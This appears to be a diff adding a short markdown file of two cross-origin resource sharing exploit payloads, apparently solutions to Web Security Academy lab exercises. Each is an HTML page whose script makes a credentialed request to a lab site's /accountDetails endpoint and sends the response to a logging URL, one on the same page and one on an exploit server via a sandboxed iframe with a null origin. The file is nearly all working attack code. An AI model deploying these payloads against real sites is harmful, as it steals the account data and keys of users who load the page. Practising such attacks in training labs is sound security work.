@@ -1,0 +1,38 @@
+# CORS reflect origin, Allow Credentials : true
+
+```html
+
+<html>
+
+    <body>
+
+        <script>
+        const req = new XMLHttpRequest();
+        req.onload = function() { 
+            fetch('/log?key=' + req.responseText)
+            }
+        req.open('GET', 'https://0a3400cf04cf185f8276e2d900e100c6.web-security-academy.net/accountDetails')
+        req.withCredentials = true
+        req.send();
+        </script>
+
+    </body>
+
+</html>
+
+```
+
+# Origin null
+
+```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://0a4f007f0416b4c683529c9400a20079.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='https://exploit-0aaf0040046ab41283989b6c018b00a2.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
+```
